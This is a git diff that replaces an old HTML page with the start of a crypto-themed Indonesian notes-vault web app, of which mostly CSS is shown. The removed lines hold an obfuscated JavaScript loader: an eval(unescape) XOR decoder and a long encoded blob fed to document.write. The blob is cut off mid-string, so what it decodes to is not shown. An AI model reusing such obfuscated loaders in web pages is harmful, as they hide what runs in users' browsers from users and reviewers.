@@ -1,16 +1,897 @@
-<html>
+
+<!DOCTYPE html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VAULT DATA PENTING</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --bg-card: rgba(30, 41, 59, 0.8);
+            --accent: #3b82f6;
+            --accent-hover: #60a5fa;
+            --text-primary: #f1f5f9;
+            --text-secondary: #cbd5e1;
+            --danger: #ef4444;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --info: #06b6d4;
+            --crypto-gold: #FFD700;
+            --crypto-silver: #C0C0C0;
+            --crypto-bronze: #CD7F32;
+            --crypto-bitcoin: #F7931A;
+            --crypto-ethereum: #627EEA;
+            --border: #334155;
+            --shadow: rgba(0, 0, 0, 0.3);
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        html { font-size: 16px; height: 100%; }
+        body {
+            margin: 0; padding: 0; overflow-x: hidden; min-height: 100vh;
+            background: var(--bg-primary); color: var(--text-primary);
+        }
+
+        .crypto-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; z-index: -1; background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%); }
+        .crypto-particle { position: absolute; width: 20px; height: 20px; background: radial-gradient(circle at 30% 30%, var(--crypto-gold), transparent); border-radius: 50%; box-shadow: 0 0 10px var(--crypto-gold), inset 0 0 5px rgba(255,215,0,0.5); filter: blur(1px); animation: float 25s infinite linear; opacity: 0.6; }
+        .crypto-particle:nth-child(odd) { background: radial-gradient(circle at 30% 30%, var(--crypto-bitcoin), transparent); box-shadow: 0 0 10px var(--crypto-bitcoin), inset 0 0 5px rgba(247,147,26,0.5); }
+        .crypto-particle:nth-child(3n) { background: radial-gradient(circle at 30% 30%, var(--crypto-ethereum), transparent); box-shadow: 0 0 10px var(--crypto-ethereum), inset 0 0 5px rgba(98,126,234,0.5); }
+        .crypto-particle:nth-child(4n) { background: radial-gradient(circle at 30% 30%, var(--crypto-silver), transparent); box-shadow: 0 0 10px var(--crypto-silver), inset 0 0 5px rgba(192,192,192,0.5); }
+        .crypto-particle:nth-child(5n) { background: radial-gradient(circle at 30% 30%, var(--crypto-bronze), transparent); box-shadow: 0 0 10px var(--crypto-bronze), inset 0 0 5px rgba(205,127,50,0.5); }
+        @keyframes float { 0% { transform: translateY(100vh) rotate(0deg); } 100% { transform: translateY(-100vh) rotate(360deg); } }
+        .blur-effect { position: fixed; width: 200%; height: 200%; top: -50%; left: -50%; background: radial-gradient(circle at 20% 50%, rgba(59,130,246,0.1) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(139,92,246,0.1) 0%, transparent 50%), radial-gradient(circle at 40% 80%, rgba(247,147,26,0.1) 0%, transparent 50%); animation: blurMove 60s infinite alternate ease-in-out; filter: blur(40px); z-index: -2; }
+        @keyframes blurMove { 0% { transform: translate(0%,0%) rotate(0deg); } 33% { transform: translate(-5%,5%) rotate(120deg); } 66% { transform: translate(5%,-5%) rotate(240deg); } 100% { transform: translate(0%,0%) rotate(360deg); } }
+
+        /* login */
+        .login-container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; position: relative; z-index: 1; width: 100%; }
+        .login-box { background: rgba(30,41,59,0.85); backdrop-filter: blur(12px); border-radius: 20px; padding: 32px 24px; width: 100%; max-width: 400px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05), inset 0 1px 0 rgba(255,255,255,0.1); animation: loginSlideUp 0.6s ease-out; position: relative; overflow: hidden; }
+        .login-box::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, var(--crypto-bitcoin), var(--crypto-ethereum), var(--crypto-gold)); }
+        .login-header { text-align: center; margin-bottom: 32px; }
+        .login-logo { font-size: 2.8rem; margin-bottom: 16px; display: inline-block; background: linear-gradient(135deg, var(--crypto-gold), var(--crypto-bitcoin)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 8px rgba(255,215,0,0.3)); }
+        .login-title { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; background: linear-gradient(135deg, #f1f5f9, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1.3; }
+        .login-subtitle { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 24px; }
+        .login-form { display: flex; flex-direction: column; gap: 20px; }
+        .form-group { position: relative; }
+        .form-label { display: block; margin-bottom: 6px; color: var(--text-primary); font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 6px; }
+        .form-input { width: 100%; padding: 14px; background: rgba(15,23,42,0.7); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: var(--text-primary); font-size: 1rem; transition: all 0.3s ease; outline: none; -webkit-appearance: none; }
+        .form-input:focus { border-color: var(--crypto-gold); box-shadow: 0 0 0 3px rgba(255,215,0,0.15); background: rgba(15,23,42,0.9); }
+        .password-toggle { position: absolute; right: 12px; top: 40px; background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1rem; transition: color 0.3s ease; padding: 8px; display: flex; align-items: center; justify-content: center; width: 40px; height: 40px; border-radius: 50%; }
+        .password-toggle:hover { color: var(--crypto-gold); background: rgba(255,255,255,0.05); }
+        .login-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--crypto-bitcoin), var(--crypto-gold)); border: none; border-radius: 10px; color: white; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 8px; box-shadow: 0 4px 12px rgba(247,147,26,0.3); min-height: 52px; }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(247,147,26,0.4); background: linear-gradient(135deg, var(--crypto-gold), var(--crypto-bitcoin)); }
+        .login-footer { text-align: center; margin-top: 24px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1); color: var(--text-secondary); font-size: 0.85rem; }
+        .login-error { background: rgba(239,68,68,0.2); border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 8px; margin-top: 16px; text-align: center; font-size: 0.85rem; animation: fadeIn 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 6px; }
+
+        /* main app */
+        .main-app { display: none; min-height: 100vh; position: relative; width: 100%; }
+        .main-app.active { display: block; }
+        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 16px; }
+        header { text-align: center; margin-bottom: 24px; padding: 16px 0; }
+        header h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; background: linear-gradient(90deg, var(--accent), #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: inline-block; position: relative; line-height: 1.3; padding: 0 8px; }
+        header h1::after { content: ''; position: absolute; bottom: -6px; left: 50%; transform: translateX(-50%); width: 80px; height: 3px; background: linear-gradient(90deg, var(--accent), #8b5cf6); border-radius: 2px; }
+        .stats-container { display: grid; grid-template-columns: 1fr; gap: 16px; margin-bottom: 24px; }
+        .stat-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 14px; padding: 20px 16px; border: 1px solid var(--glass); transition: all 0.3s ease; text-align: center; position: relative; overflow: hidden; }
+        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, var(--accent), #8b5cf6); }
+        .stat-card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px var(--shadow); border-color: rgba(59,130,246,0.3); }
+        .stat-icon { font-size: 1.8rem; color: var(--accent); background: rgba(59,130,246,0.1); width: 60px; height: 60px; line-height: 60px; border-radius: 50%; margin: 0 auto 12px; }
+        .stat-value { font-size: 2rem; font-weight: 700; margin-bottom: 4px; color: var(--text-primary); text-shadow: 0 2px 4px rgba(0,0,0,0.2); line-height: 1.2; }
+        .stat-label { font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* form */
+        .form-container { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 14px; padding: 20px; margin-bottom: 24px; border: 1px solid var(--glass); box-shadow: 0 6px 16px rgba(0,0,0,0.2); }
+        .form-title { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; color: var(--accent); }
+        .form-title h2 { font-size: 1.3rem; font-weight: 600; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; color: var(--accent); font-size: 0.9rem; display: flex; align-items: center; gap: 6px; }
+        input, textarea { width: 100%; padding: 14px; background: rgba(15,23,42,0.7); border: 1px solid var(--border); border-radius: 10px; color: var(--text-primary); font-size: 1rem; transition: all 0.3s ease; outline: none; -webkit-appearance: none; }
+        input:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(59,130,246,0.2); background: rgba(15,23,42,0.9); }
+        textarea { min-height: 150px; resize: vertical; font-family: 'Monaco','Menlo','Ubuntu Mono',monospace; line-height: 1.5; }
+        .char-count { text-align: right; font-size: 0.8rem; color: var(--text-secondary); margin-top: 4px; }
+        .form-actions { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
+        .btn { padding: 14px 20px; border: none; border-radius: 10px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center; justify-content: center; gap: 8px; flex: 1; min-height: 48px; }
+        .btn-primary { background: linear-gradient(135deg, var(--accent), #8b5cf6); color: white; box-shadow: 0 4px 12px rgba(59,130,246,0.3); }
+        .btn-primary:hover { background: linear-gradient(135deg, var(--accent-hover), #9d7cf8); transform: translateY(-2px); box-shadow: 0 6px 16px rgba(59,130,246,0.4); }
+        .btn-danger { background: linear-gradient(135deg, var(--danger), #dc2626); color: white; box-shadow: 0 4px 12px rgba(239,68,68,0.3); }
+        .btn-success { background: linear-gradient(135deg, var(--success), #059669); color: white; box-shadow: 0 4px 12px rgba(16,185,129,0.3); }
+        .btn-warning { background: linear-gradient(135deg, var(--warning), #d97706); color: white; box-shadow: 0 4px 12px rgba(245,158,11,0.3); }
+        .btn-info { background: linear-gradient(135deg, var(--info), #0891b2); color: white; box-shadow: 0 4px 12px rgba(6,182,212,0.3); }
+
+        /* notes list + SEARCH */
+        .notes-header {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .search-wrapper {
+            position: relative;
+            flex: 1 1 200px;
+            min-width: 200px;
+        }
+        .search-input {
+            width: 100%;
+            padding: 12px 16px 12px 40px;
+            background: rgba(15,23,42,0.7);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+        .search-input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+            background: rgba(15,23,42,0.9);
+            outline: none;
+        }
+        .search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            font-size: 1rem;
+            pointer-events: none;
+        }
+        .notes-count {
+            background: linear-gradient(135deg, var(--accent), #8b5cf6);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            width: fit-content;
+            box-shadow: 0 4px 12px rgba(59,130,246,0.3);
+            flex-shrink: 0;
+        }
+        #notesList {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+        .note-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 14px; padding: 20px; border: 1px solid var(--glass); transition: all 0.3s ease; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+        .note-card::before { content: ''; position: absolute; top: 0; left: 0; width: 6px; height: 100%; background: linear-gradient(to bottom, var(--accent), #8b5cf6); }
+        .note-card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px var(--shadow); border-color: rgba(59,130,246,0.3); }
+        .note-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 12px; color: var(--text-primary); word-break: break-word; padding-left: 10px; }
+        .note-content { color: var(--text-secondary); margin-bottom: 16px; flex-grow: 1; word-break: break-word; overflow: hidden; line-height: 1.6; max-height: 100px; position: relative; padding-left: 10px; font-size: 0.95rem; }
+        .note-content::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 30px; background: linear-gradient(transparent, var(--bg-card)); }
+        .note-date { font-size: 0.8rem; color: #94a3b8; margin-bottom: 16px; display: flex; align-items: center; gap: 6px; padding-left: 10px; }
+        .note-actions { display: flex; flex-direction: column; gap: 8px; margin-top: auto; }
+        .note-actions .btn { padding: 10px; font-size: 0.9rem; border-radius: 8px; min-height: 44px; }
+
+        /* modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 1000; align-items: center; justify-content: center; padding: 16px; animation: fadeIn 0.3s ease; overflow-y: auto; }
+        .modal.show { display: flex; }
+        .modal-content { background: var(--bg-card); backdrop-filter: blur(20px); border-radius: 16px; padding: 24px; width: 100%; max-width: 700px; max-height: 90vh; overflow-y: auto; border: 1px solid var(--glass); box-shadow: 0 20px 40px rgba(0,0,0,0.5); animation: modalSlideIn 0.4s ease; position: relative; }
+        .modal-content::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: linear-gradient(90deg, var(--accent), #8b5cf6); border-radius: 16px 16px 0 0; }
+        .modal-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
+        .modal-title { font-size: 1.3rem; font-weight: 700; color: var(--accent); display: flex; align-items: center; gap: 10px; line-height: 1.4; word-break: break-word; flex: 1; margin-right: 10px; }
+        .close-modal { background: none; border: none; color: var(--text-secondary); font-size: 1.8rem; cursor: pointer; transition: color 0.3s ease; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 50%; flex-shrink: 0; }
+        .close-modal:hover { color: var(--danger); background: rgba(239,68,68,0.1); }
+        .modal-body { margin-bottom: 20px; }
+        .modal-actions { display: flex; flex-direction: column; gap: 10px; margin-top: 24px; padding-top: 16px; border-top: 1px solid var(--border); }
+
+        /* loading & empty */
+        .loading, .empty-state, .error-state { text-align: center; padding: 40px 16px; grid-column: 1 / -1; }
+        .loading i { font-size: 2.5rem; color: var(--accent); margin-bottom: 16px; animation: pulse 1.5s infinite; }
+        .empty-state i, .error-state i { font-size: 3rem; color: var(--text-secondary); margin-bottom: 16px; opacity: 0.7; }
+        .error-state i { color: var(--danger); }
+
+        /* logout */
+        .logout-btn { position: fixed; top: 16px; right: 16px; background: rgba(239,68,68,0.2); border: 1px solid var(--danger); color: var(--danger); padding: 10px 16px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 6px; font-weight: 600; transition: all 0.3s ease; z-index: 100; font-size: 0.9rem; min-height: 44px; backdrop-filter: blur(10px); }
+        .logout-btn:hover { background: var(--danger); color: white; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(239,68,68,0.3); }
+
+        /* toast */
+        .toast { position: fixed; bottom: 16px; right: 16px; left: 16px; background: var(--success); color: white; padding: 14px 20px; border-radius: 10px; display: flex; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); z-index: 1001; animation: slideUp 0.3s ease; max-width: 400px; margin: 0 auto; }
+        .toast.hidden { animation: slideDown 0.3s ease forwards; }
+        .toast.error { background: var(--danger); }
+        .toast.warning { background: var(--warning); }
+        .toast.info { background: var(--info); }
+
+        /* animasi */
+        @keyframes loginSlideUp { from { opacity:0; transform:translateY(40px) scale(0.95); } to { opacity:1; transform:translateY(0) scale(1); } }
+        @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+        @keyframes pulse { 0% { transform:scale(1); } 50% { transform:scale(1.05); } 100% { transform:scale(1); } }
+        @keyframes modalSlideIn { from { opacity:0; transform:translateY(-40px) scale(0.95); } to { opacity:1; transform:translateY(0) scale(1); } }
+        @keyframes slideUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes slideDown { from { opacity:1; transform:translateY(0); } to { opacity:0; transform:translateY(20px); } }
+
+        /* scroll */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-secondary); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: linear-gradient(to bottom, var(--accent), #8b5cf6); border-radius: 4px; }
+
+        /* responsive */
+        @media (min-width: 600px) { .stats-container { grid-template-columns: repeat(2,1fr); } .form-actions { flex-direction: row; } #notesList { grid-template-columns: repeat(2,1fr); } }
+        @media (min-width: 768px) { .stats-container { grid-template-columns: repeat(3,1fr); } }
+        @media (min-width: 1024px) { #notesList { grid-template-columns: repeat(3,1fr); } }
+
+        /* tambahan gambar */
+        .note-image-thumb { margin: 10px 0 10px 10px; max-width: 100%; border-radius: 6px; max-height: 100px; object-fit: cover; border: 1px solid var(--border); }
+        .modal-image-large { max-width: 100%; max-height: 300px; border-radius: 8px; margin-top: 10px; border: 1px solid var(--border); }
+        #imagePreviewContainer { margin-top: 10px; position: relative; display: none; }
+        #imagePreview { max-width: 100%; max-height: 150px; border-radius: 8px; border: 1px solid var(--border); }
+        #removeImageBtn { position: absolute; top: 5px; right: 5px; padding: 5px 10px; min-height: auto; font-size: 0.8rem; }
+    </style>
 </head>
 <body>
+    <div class="crypto-background" id="cryptoBackground"><div class="blur-effect"></div></div>
 
-<script type="text/javascript">
-<!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%75%30%39%38%33%64%31%37%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%38%35%30%39%36%39%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%35%31%35%32%31%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%31%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%75%30%39%38%33%64%31%37%64%28%27') + '%3b%21%44%54%47%55%5d%57%43%20%6c%77%6f%6b%3c%0f%0f%3e%69%72%68%68%20%68%60%6e%6e%3d%22%6e%66%23%38%08%0e%3c%6c%64%63%63%3c%0f%0f%22%21%26%27%38%6f%63%77%63%27%67%68%66%70%74%61%73%3b%22%53%57%46%28%3a%22%3b%0d%0b%26%27%24%20%38%6c%67%73%61%20%6b%61%6e%61%38%26%76%6f%64%79%77%73%72%71%20%21%63%76%6a%74%63%6d%74%38%20%79%6e%66%75%6e%38%60%67%72%68%65%60%2d%79%6e%66%75%6e%2b%24%6b%6a%68%74%6c%61%6c%2a%77%64%65%6b%63%3f%37%2d%30%2b%22%6f%66%7a%6a%69%70%6b%2f%71%66%63%6b%65%3f%36%2c%31%2a%27%73%75%63%71%2f%72%67%63%69%61%63%6a%60%3b%6e%75%21%3e%08%08%20%25%22%21%3a%73%6f%74%68%64%3e%51%41%57%49%56%21%42%44%50%43%24%53%47%49%56%4b%4b%4b%3d%37%73%6f%74%68%64%3e%08%08%20%25%22%21%3a%6b%6f%6e%69%23%72%60%6e%3f%27%72%73%61%62%75%6e%6a%64%65%73%20%20%6d%70%66%60%38%26%68%70%77%70%72%38%31%34%64%70%68%73%71%2e%6d%72%71%6e%6e%67%66%72%6a%73%29%61%71%6b%21%3e%08%08%20%25%22%21%3a%6b%6f%6e%69%23%72%60%6e%3f%27%72%73%61%62%75%6e%6a%64%65%73%20%20%6d%70%66%60%38%26%68%70%77%70%72%38%31%34%64%70%68%73%71%2e%6d%76%74%64%76%6b%60%2c%64%77%68%26%20%61%71%71%72%77%71%77%69%68%6d%69%3a%0f%0e%23%20%27%22%3c%69%69%6f%6b%27%6c%72%63%65%3f%25%6a%74%71%72%74%3c%36%35%66%75%6d%74%72%2c%69%74%73%68%6a%60%67%70%6f%76%2e%62%73%6f%34%67%74%73%35%45%66%67%6c%6b%6b%79%3f%4e%6c%75%61%75%3e%79%6d%6b%74%47%37%30%35%3f%35%36%37%39%37%34%33%3d%31%32%30%38%3b%31%36%21%60%6b%71%73%6c%64%79%3f%70%7b%62%76%25%24%72%63%6f%3f%25%77%74%7e%6e%66%73%6f%63%67%70%21%3e%08%08%20%25%22%21%3a%6b%6f%6e%69%23%72%60%6e%3f%27%77%75%7d%6b%63%75%6c%64%67%73%20%20%6d%70%66%60%38%26%68%70%77%70%72%38%31%34%67%65%68%6d%71%2e%61%6f%71%70%66%66%69%61%73%61%29%61%71%6b%32%63%6d%61%78%34%6e%6a%64%72%35%66%75%6d%74%28%61%79%62%77%70%69%60%35%36%2a%37%2e%37%33%65%70%77%30%65%6b%68%2e%6b%68%6e%29%67%75%70%20%3f%09%0d%24%20%24%23%3c%72%76%7b%69%65%3f%09%0d%24%20%24%23%20%27%22%20%3f%70%70%77%73%24%7d%0b%09%20%27%22%20%25%22%21%26%27%24%20%24%2c%2f%65%6b%2f%75%70%6a%69%64%76%7b%3e%23%25%37%64%33%3c%30%62%3b%08%0e%20%24%23%20%27%22%20%25%22%21%26%27%2b%2f%66%6a%2f%72%65%65%74%6c%65%65%75%7f%3a%24%26%33%60%30%3b%30%60%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%28%2b%62%6d%2c%65%64%70%64%3f%22%73%6f%65%67%28%31%33%2c%27%36%33%29%22%36%3d%2b%24%30%2a%3b%2b%3a%0d%0a%25%22%21%26%27%24%20%24%23%20%27%22%2f%2a%61%64%63%60%6a%74%3e%23%25%32%60%38%37%64%37%3b%08%0e%20%24%23%20%27%22%20%25%22%21%26%27%2b%2f%67%66%65%60%6c%74%2a%6a%70%70%60%76%3a%24%26%36%37%61%37%63%61%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%28%2b%74%63%7b%74%28%72%72%6e%6d%62%74%7c%3e%20%21%65%33%61%35%66%3e%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%29%28%70%67%7c%77%2f%72%65%65%74%6c%65%65%75%7f%3a%24%26%65%65%66%37%62%31%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%28%2b%64%67%6d%69%60%70%3a%25%27%66%60%33%30%34%30%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%28%2d%75%72%67%64%61%72%71%3a%24%26%33%37%60%3b%3d%31%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%28%2b%79%67%71%6e%6c%6c%69%3f%22%24%60%30%3f%67%34%61%3d%08%08%20%25%22%21%26%27%24%20%24%23%20%27%2d%2f%6e%6c%67%77%3d%24%25%34%35%62%31%66%34%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%2e%29%62%76%7b%74%77%71%28%6b%71%69%66%3b%26%22%42%46%40%3a%30%37%3f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%2a%2d%64%74%7c%74%74%75%2c%75%6c%6e%76%62%70%3b%26%22%41%30%41%33%45%37%3f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%2a%2d%64%74%7c%74%74%75%2c%62%75%73%6e%7f%65%3b%26%22%41%44%3d%45%35%35%3f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%2a%2d%64%74%7c%74%74%75%2c%62%6c%76%65%74%69%6f%3c%27%21%46%3d%38%35%34%41%3d%0a%08%21%26%27%24%20%24%23%20%27%22%20%25%2d%2e%63%75%7f%70%70%72%2f%60%76%68%62%70%66%71%68%3e%20%21%35%32%3e%45%47%46%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%29%28%66%71%76%67%67%75%38%20%20%37%34%32%34%33%37%39%0c%0a%27%22%20%25%22%21%26%27%24%20%24%23%2f%28%77%68%66%66%70%7f%3d%24%72%6d%61%63%2f%32%2c%25%32%2d%26%37%28%20%34%2d%35%2c%3f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%2a%2d%68%6a%64%71%75%3e%23%72%6e%60%63%2d%30%36%31%2b%24%32%33%34%2c%27%30%37%32%2e%21%36%29%34%37%2f%3e%0f%0d%22%20%25%22%21%26%27%24%7f%0b%09%0f%0d%22%20%25%22%21%26%27%24%2a%24%7e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%68%61%72%6c%69%6f%3c%27%34%3d%0b%09%20%27%22%20%25%22%21%26%27%24%20%24%73%63%63%66%6b%6b%6b%3b%26%37%39%0f%0e%23%20%27%22%20%25%22%21%26%27%24%20%66%72%78%28%77%6b%7f%69%6f%6f%3d%24%62%75%71%64%60%70%2f%67%73%79%3b%08%0e%20%24%23%20%27%22%20%25%22%21%26%27%62%71%6a%77%2f%61%61%6f%6e%6e%7a%3c%27%2d%4b%6a%77%67%75%2b%2c%25%77%62%68%72%2b%75%63%71%6b%61%3f%0f%0f%22%21%26%27%24%20%24%23%7f%08%08%0f%0f%22%21%26%27%24%20%24%23%68%73%6d%6c%25%7f%21%60%76%6a%74%2b%76%6b%7d%65%3a%25%31%37%76%7f%39%20%6c%64%6b%6e%6a%74%3f%22%32%36%37%23%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%62%75%67%7b%27%7f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%6a%61%73%6f%6c%6a%3a%24%33%3d%27%72%63%61%66%6a%68%6e%3e%20%34%3e%20%76%74%67%77%64%6d%77%7e%2b%78%3e%23%68%6c%66%64%62%6c%3c%26%68%6f%6e%2b%6b%67%6c%6b%68%71%38%21%35%37%34%76%6c%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%65%61%65%68%6b%73%77%70%6a%64%3e%23%76%64%70%28%2a%2d%63%6f%28%74%72%6f%6c%63%75%79%2b%38%22%64%77%6b%75%72%3e%23%76%64%70%28%2a%2d%75%61%7f%70%2f%74%71%6b%68%61%72%7e%29%3c%09%0d%24%20%24%23%20%27%22%20%7a%0d%0b%09%0d%24%20%24%23%20%27%22%20%34%28%21%64%64%61%6d%6d%71%71%70%6c%64%25%6f%73%6d%77%70%71%24%29%31%08%08%20%25%22%21%26%27%24%20%2a%66%72%7c%72%74%74%2d%63%65%62%69%69%76%72%77%69%66%20%78%22%71%77%72%6f%74%6f%72%6e%3d%22%66%6e%7a%66%62%3a%24%74%75%73%3a%27%32%3d%25%6e%66%60%73%3e%20%34%3e%20%7e%69%64%71%6a%3b%26%34%34%30%23%3e%20%6f%65%6b%6c%6a%75%3c%27%37%30%34%24%3d%27%73%76%62%70%67%6a%76%7d%3a%24%6b%6b%63%66%67%6b%3f%21%7c%28%6f%6e%60%64%78%3d%22%2f%36%3f%21%64%64%61%6d%6d%71%71%70%6c%64%3f%22%6d%6d%69%63%63%76%2c%69%75%61%64%6e%65%6f%72%2f%37%35%33%67%67%6e%2e%20%20%32%67%35%3e%36%63%24%33%27%2b%22%25%36%65%33%3d%32%66%20%33%33%27%2b%22%25%35%64%32%3f%35%67%20%37%33%30%20%29%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%60%70%7a%76%73%75%2f%74%60%72%73%69%65%69%65%21%7b%27%74%71%71%68%74%6c%73%6e%3f%22%62%64%72%75%6c%73%77%67%3a%22%79%6e%66%75%6e%3d%24%32%34%73%78%3a%22%68%62%69%68%6e%73%3e%20%36%33%70%7f%3f%20%67%61%64%6b%6e%76%71%73%6d%64%3d%22%72%66%66%6a%65%6b%2b%69%76%60%64%6c%65%6e%71%2a%64%6d%75%61%6c%63%23%63%73%22%35%35%25%21%33%37%23%2c%24%75%63%75%2a%2f%2a%67%73%7d%77%70%71%2b%6a%71%6b%66%2b%29%22%75%74%64%6a%75%74%60%72%60%6c%74%2e%3f%21%64%76%76%64%63%71%2f%75%61%64%6e%75%74%3c%27%33%30%23%3e%20%65%73%78%2a%77%69%65%63%75%79%3e%23%30%27%32%20%36%32%71%7e%27%72%63%76%2b%2f%28%67%72%7e%72%75%77%28%6d%71%68%67%2b%2b%22%6b%6b%77%66%72%27%34%20%34%23%37%77%7a%20%77%6b%63%65%2f%36%37%33%2f%32%34%35%2c%35%2e%31%28%30%2f%3d%24%65%6b%6b%76%67%77%38%21%64%6b%73%72%2c%30%70%7f%29%3d%25%61%6f%6d%68%67%74%6f%72%6e%3d%22%66%69%73%62%72%27%36%37%71%23%6b%69%64%6b%6b%69%75%61%27%68%6